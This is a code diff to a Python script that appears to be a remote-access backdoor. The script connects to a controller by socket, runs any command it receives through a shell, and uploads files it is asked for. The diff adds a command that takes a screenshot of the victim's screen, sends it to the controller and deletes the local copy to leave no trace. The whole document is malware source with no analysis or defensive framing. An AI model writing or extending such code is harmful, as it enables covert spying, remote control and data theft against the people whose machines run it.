@@ -2,6 +2,7 @@ import socket
 import json
 import subprocess
 import os
+import pyautogui
 
 
 
@@ -38,6 +39,10 @@ def upload_file(filename):
     f = open(filename, 'rb')
     s.send(f.read())
 
+def screenshot():
+    sshot = pyautogui.screenshot()
+    sshot.save('screen.png')
+
 def shell():    
     while True:
         command = reliable_rcv()
@@ -57,6 +62,11 @@ def shell():
 
         elif command[:8] == "download":
             upload_file(command[9:])
+
+        elif command[:10] == "screenshot":
+            screenshot()
+            upload_file('screen.png')
+            os.remove('screen.png')
 
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
